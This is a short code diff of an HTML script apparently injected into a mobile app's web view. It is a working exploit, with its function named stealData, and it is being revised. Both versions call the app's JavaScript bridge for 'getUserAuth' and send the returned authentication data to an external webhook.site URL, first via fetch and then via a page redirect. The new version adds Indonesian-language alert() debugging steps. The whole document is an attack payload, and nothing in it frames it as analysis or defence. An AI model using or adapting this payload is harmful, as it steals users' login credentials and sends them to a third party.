@@ -1,13 +1,21 @@
 <script>
-    function stealData() {
-        if(typeof bridge !== "undefined"){
-            bridge.call("getUserAuth", {}, function(resp) {
-                fetch("https://webhook.site/767aff36-7e40-4fb5-ae1a-93431ada5cab?data=" + encodeURIComponent(JSON.stringify(resp)));
-            });
-        } else {
-            console.log("bridge not found");
-        }
-    }
+function stealData() {
+    alert("script jalan"); // cek script ke-load
 
-    setTimeout(stealData, 1000);
+    if (typeof bridge !== "undefined") {
+        alert("bridge ada"); // cek bridge exist
+
+        bridge.call("getUserAuth", {}, function(resp) {
+            alert("dapet resp: " + JSON.stringify(resp)); // 🔥 paling penting
+
+            location = "https://webhook.site/767aff36-7e40-4fb5-ae1a-93431ada5cab?data=" 
+                + encodeURIComponent(JSON.stringify(resp));
+        });
+
+    } else {
+        alert("bridge ga ada");
+    }
+}
+
+setTimeout(stealData, 1000);
 </script>
